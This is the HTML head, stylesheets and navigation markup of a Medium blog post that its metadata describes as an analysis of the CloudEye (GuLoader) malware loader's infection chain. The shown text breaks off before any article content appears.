<!doctype html><html lang="en"><head><title data-rh="true">CloudEyE — From .lnk to Shellcode | by Gi7w0rm | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2023-07-09T01:34:17.028Z"/><meta data-rh="true" name="title" content="CloudEyE — From .lnk to Shellcode | by Gi7w0rm | Medium"/><meta data-rh="true" property="og:title" content="CloudEyE — From .lnk to Shellcode"/><meta data-rh="true" property="al:android:url" content="medium://p/4b5f1d6d877"/><meta data-rh="true" property="al:ios:url" content="medium://p/4b5f1d6d877"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="Hello and welcome back to another blog post. Today, we will look at the infection chain of a well-known malware loader called CloudEye (GuLoader). In recent years, this shellcode-based downloader has…"/><meta data-rh="true" property="og:description" content="Hello and welcome back to another blog post. Today, we will look at the infection chain of a well-known malware loader called CloudEye…"/><meta data-rh="true" property="og:url" content="https://gi7w0rm.medium.com/cloudeye-from-lnk-to-shellcode-4b5f1d6d877"/><meta data-rh="true" property="al:web:url" content="https://gi7w0rm.medium.com/cloudeye-from-lnk-to-shellcode-4b5f1d6d877"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:949/1*iZAFaE20Ffz3o6zT65W6DQ.png"/><meta data-rh="true" property="article:author" content="https://gi7w0rm.medium.com"/><meta data-rh="true" name="author" content="Gi7w0rm"/><meta data-rh="true" name="robots" content="index,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="unsafe-url"/><meta data-rh="true" property="twitter:title" content="CloudEyE — From .lnk to Shellcode"/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/4b5f1d6d877"/><meta data-rh="true" property="twitter:description" content="Hello and welcome back to another blog post. Today, we will look at the infection chain of a well-known malware loader called CloudEye…"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:949/1*iZAFaE20Ffz3o6zT65W6DQ.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:creator" content="@Gi7w0rm"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="12 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://gi7w0rm.medium.com"/><link data-rh="true" rel="canonical" href="https://gi7w0rm.medium.com/cloudeye-from-lnk-to-shellcode-4b5f1d6d877"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/4b5f1d6d877"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*iZAFaE20Ffz3o6zT65W6DQ.png"],"url":"https:\u002F\u002Fgi7w0rm.medium.com\u002Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877","dateCreated":"2023-07-09T00:57:16.487Z","datePublished":"2023-07-09T00:57:16.487Z","dateModified":"2023-07-13T09:56:08.558Z","headline":"CloudEyE — From .lnk to Shellcode - Gi7w0rm - Medium","name":"CloudEyE — From .lnk to Shellcode - Gi7w0rm - Medium","description":"Hello and welcome back to another blog post. Today, we will look at the infection chain of a well-known malware loader called CloudEye (GuLoader). In recent years, this shellcode-based downloader has…","identifier":"4b5f1d6d877","author":{"@type":"Person","name":"Gi7w0rm","url":"https:\u002F\u002Fgi7w0rm.medium.com"},"creator":["Gi7w0rm"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fgi7w0rm.medium.com\u002F","logo":{"@type":"ImageObject","width":272,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:544\u002F7*V1_7XP4snlmqrc_0Njontw.png"}},"mainEntityOfPage":"https:\u002F\u002Fgi7w0rm.medium.com\u002Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877"}</script><style type="text/css" data-fela-rehydration="533" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="533" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:#1A8917}.es{border-color:#1A8917}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:#1A8917}.ez:disabled:hover{border-color:#1A8917}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fz{margin:0 24px}.gd{background:rgba(255, 255, 255, 1)}.ge{border:1px solid #F2F2F2}.gf{box-shadow:0 1px 4px #F2F2F2}.gg{max-height:100vh}.gh{overflow-y:auto}.gi{left:0}.gj{top:calc(100vh + 100px)}.gk{bottom:calc(100vh + 100px)}.gl{width:10px}.gm{pointer-events:none}.gn{word-break:break-word}.go{word-wrap:break-word}.gp:after{display:block}.gq:after{content:""}.gr:after{clear:both}.gs{line-height:1.23}.gt{letter-spacing:0}.gu{font-style:normal}.gv{font-weight:700}.ia{align-items:baseline}.ib{width:48px}.ic{height:48px}.id{border:2px solid rgba(255, 255, 255, 1)}.ie{z-index:0}.if{box-shadow:none}.ig{border:1px solid rgba(0, 0, 0, 0.05)}.ih{margin-bottom:2px}.ii{flex-wrap:nowrap}.ij{font-size:16px}.ik{line-height:24px}.im{margin:0 8px}.in{display:inline}.io{color:#1A8917}.ip{fill:#1A8917}.is{flex:0 0 auto}.iv{flex-wrap:wrap}.iw{padding-left:8px}.ix{padding-right:8px}.jy> *{flex-shrink:0}.jz{overflow-x:scroll}.ka::-webkit-scrollbar{display:none}.kb{scrollbar-width:none}.kc{-ms-overflow-style:none}.kd{width:74px}.ke{flex-direction:row}.kf{z-index:2}.kg{margin-right:4px}.kj{-webkit-user-select:none}.kk{border:0}.kl{fill:rgba(117, 117, 117, 1)}.ko{outline:0}.kp{user-select:none}.kq> svg{pointer-events:none}.kz{cursor:progress}.la{margin-left:4px}.lb{margin-top:0px}.lc{opacity:1}.ld{padding:4px 0}.lg{width:16px}.li{display:inline-flex}.lo{max-width:100%}.lp{padding:8px 2px}.lq svg{color:#6B6B6B}.mh{line-height:1.58}.mi{letter-spacing:-0.004em}.mj{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.ne{margin-bottom:-0.46em}.nf{margin-left:auto}.ng{margin-right:auto}.nh{max-width:949px}.nn{clear:both}.np{cursor:zoom-in}.nq{z-index:auto}.ns{height:auto}.nt{margin-top:10px}.nu{max-width:728px}.nx{font-style:italic}.ny{margin-top:32px}.nz{margin-bottom:14px}.oa{padding-top:24px}.ob{padding-bottom:10px}.oc{background-color:#000000}.od{height:3px}.oe{width:3px}.of{margin-right:20px}.og{line-height:1.18}.oh{letter-spacing:-0.022em}.oi{font-weight:600}.oy{margin-bottom:-0.31em}.pe{text-decoration:underline}.pf{max-width:1443px}.pg{overflow-x:auto}.ph{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.pi{padding:32px}.pj{border:1px solid #E5E5E5}.pk{line-height:1.4}.pl{margin-top:-0.2em}.pm{margin-bottom:-0.2em}.pn{white-space:pre}.po{min-width:fit-content}.pp{max-width:1295px}.pq{max-width:1192px}.pr{max-width:1445px}.ps{max-width:3359px}.pt{max-width:3442px}.pu{max-width:3349px}.pv{max-width:1966px}.pw{max-width:2633px}.px{max-width:2637px}.py{list-style-type:decimal}.pz{margin-left:30px}.qa{padding-left:0px}.qg{line-height:1.12}.qz{margin-bottom:-0.28em}.ra{margin-bottom:26px}.rb{margin-top:6px}.rc{margin-top:8px}.rd{margin-right:8px}.re{padding:8px 16px}.rf{border-radius:100px}.rg{transition:background 300ms ease}.ri{white-space:nowrap}.rj{border-top:none}.rp{height:52px}.rq{max-height:52px}.rr{box-sizing:content-box}.rs{position:static}.rt{z-index:1}.rv{max-width:155px}.sg{align-items:flex-end}.sh{width:76px}.si{height:76px}.sj{border:2px solid #F9F9F9}.sk{height:72px}.sl{width:72px}.sm{stroke:#F2F2F2}.sn{height:36px}.so{width:36px}.sp{color:#F2F2F2}.sq{fill:#F2F2F2}.sr{background:#F2F2F2}.ss{border-color:#F2F2F2}.sy{font-weight:500}.sz{font-size:24px}.ta{line-height:30px}.tb{letter-spacing:-0.016em}.tc{margin-top:16px}.td{height:0px}.te{border-bottom:solid 1px #E5E5E5}.tk{margin-top:72px}.tl{padding:24px 0}.tm{margin-bottom:0px}.tn{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:#156D12}.eu:hover{border-color:#156D12}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.il:hover{text-decoration:underline}.iq:hover:not(:disabled){color:#156D12}.ir:hover:not(:disabled){fill:#156D12}.kn:hover{fill:rgba(8, 8, 8, 1)}.le:hover{fill:#000000}.lf:hover p{color:#000000}.lh:hover{color:#000000}.lr:hover svg{color:#000000}.rh:hover{background-color:#F2F2F2}.st:hover{background:#F2F2F2}.su:hover{border-color:#F2F2F2}.sv:hover{cursor:wait}.sw:hover{color:#F2F2F2}.sx:hover{fill:#F2F2F2}.bd:focus-within path{fill:#242424}.km:focus{fill:rgba(8, 8, 8, 1)}.ls:focus svg{color:#000000}.nr:focus{transform:scale(1.01)}.kr:active{border-style:none}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fy{margin-bottom:68px}.gc{max-width:680px}.hq{font-size:42px}.hr{margin-top:1.19em}.hs{margin-bottom:32px}.ht{line-height:52px}.hu{letter-spacing:-0.011em}.hz{align-items:center}.jk{border-top:solid 1px #F2F2F2}.jl{border-bottom:solid 1px #F2F2F2}.jm{margin:32px 0 0}.jn{padding:3px 8px}.jw> *{margin-right:24px}.jx> :last-child{margin-right:0}.ky{margin-top:0px}.ln{margin:0}.na{font-size:20px}.nb{margin-top:2.14em}.nc{line-height:32px}.nd{letter-spacing:-0.003em}.nm{margin-top:56px}.ov{margin-top:1.72em}.ow{line-height:24px}.ox{letter-spacing:0}.pd{margin-top:0.94em}.qf{margin-top:1.14em}.qv{font-size:24px}.qw{margin-top:1.25em}.qx{line-height:30px}.qy{letter-spacing:-0.016em}.ro{margin-bottom:88px}.sa{display:inline-block}.sf{padding-top:72px}.tj{margin-top:40px}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.kx{margin-top:0px}.nv{margin-left:auto}.nw{text-align:center}.rz{display:inline-block}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.kw{margin-top:0px}.ry{display:inline-block}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.ku{margin-top:0px}.kv{margin-right:0px}.rx{display:inline-block}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fu{margin-bottom:4px}.gw{font-size:32px}.gx{margin-top:1.01em}.gy{margin-bottom:24px}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.hv{align-items:flex-start}.it{flex-direction:column}.iy{margin:24px -24px 0}.iz{padding:0}.jo> *{margin-right:8px}.jp> :last-child{margin-right:24px}.kh{margin-left:0px}.ks{margin-top:0px}.kt{margin-right:0px}.lj{margin:0}.lt{border:1px solid #F2F2F2}.lu{border-radius:99em}.lv{padding:0px 16px 0px 12px}.lw{height:38px}.lx{align-items:center}.lz svg{margin-right:8px}.mk{font-size:18px}.ml{margin-top:1.56em}.mm{line-height:28px}.mn{letter-spacing:-0.003em}.ni{margin-top:40px}.oj{font-size:16px}.ok{margin-top:1.23em}.ol{letter-spacing:0}.oz{margin-top:0.67em}.qb{margin-top:1.34em}.qh{font-size:20px}.qi{margin-top:0.93em}.qj{line-height:24px}.rk{margin-bottom:80px}.rw{display:inline-block}.sb{padding-top:48px}.tf{margin-top:32px}.ly:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fx{margin-bottom:68px}.gb{max-width:680px}.hl{font-size:42px}.hm{margin-top:1.19em}.hn{margin-bottom:32px}.ho{line-height:52px}.hp{letter-spacing:-0.011em}.hy{align-items:center}.jg{border-top:solid 1px #F2F2F2}.jh{border-bottom:solid 1px #F2F2F2}.ji{margin:32px 0 0}.jj{padding:3px 8px}.ju> *{margin-right:24px}.jv> :last-child{margin-right:0}.lm{margin:0}.mw{font-size:20px}.mx{margin-top:2.14em}.my{line-height:32px}.mz{letter-spacing:-0.003em}.nl{margin-top:56px}.os{margin-top:1.72em}.ot{line-height:24px}.ou{letter-spacing:0}.pc{margin-top:0.94em}.qe{margin-top:1.14em}.qr{font-size:24px}.qs{margin-top:1.25em}.qt{line-height:30px}.qu{letter-spacing:-0.016em}.rn{margin-bottom:88px}.se{padding-top:72px}.ti{margin-top:40px}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fw{margin-bottom:68px}.ga{max-width:680px}.hg{font-size:42px}.hh{margin-top:1.19em}.hi{margin-bottom:32px}.hj{line-height:52px}.hk{letter-spacing:-0.011em}.hx{align-items:center}.jc{border-top:solid 1px #F2F2F2}.jd{border-bottom:solid 1px #F2F2F2}.je{margin:32px 0 0}.jf{padding:3px 8px}.js> *{margin-right:24px}.jt> :last-child{margin-right:0}.ll{margin:0}.ms{font-size:20px}.mt{margin-top:2.14em}.mu{line-height:32px}.mv{letter-spacing:-0.003em}.nk{margin-top:56px}.op{margin-top:1.72em}.oq{line-height:24px}.or{letter-spacing:0}.pb{margin-top:0.94em}.qd{margin-top:1.14em}.qn{font-size:24px}.qo{margin-top:1.25em}.qp{line-height:30px}.qq{letter-spacing:-0.016em}.rm{margin-bottom:88px}.sd{padding-top:72px}.th{margin-top:40px}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fv{margin-bottom:4px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.hw{align-items:flex-start}.iu{flex-direction:column}.ja{margin:24px 0 0}.jb{padding:0}.jq> *{margin-right:8px}.jr> :last-child{margin-right:8px}.ki{margin-left:0px}.lk{margin:0}.ma{border:1px solid #F2F2F2}.mb{border-radius:99em}.mc{padding:0px 16px 0px 12px}.md{height:38px}.me{align-items:center}.mg svg{margin-right:8px}.mo{font-size:18px}.mp{margin-top:1.56em}.mq{line-height:28px}.mr{letter-spacing:-0.003em}.nj{margin-top:40px}.om{font-size:16px}.on{margin-top:1.23em}.oo{letter-spacing:0}.pa{margin-top:0.67em}.qc{margin-top:1.34em}.qk{font-size:20px}.ql{margin-top:0.93em}.qm{line-height:24px}.rl{margin-bottom:80px}.sc{padding-top:48px}.tg{margin-top:32px}.mf:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="print">.ru{display:none}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.no{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F4b5f1d6d877&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" href="https://medium.com/?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" 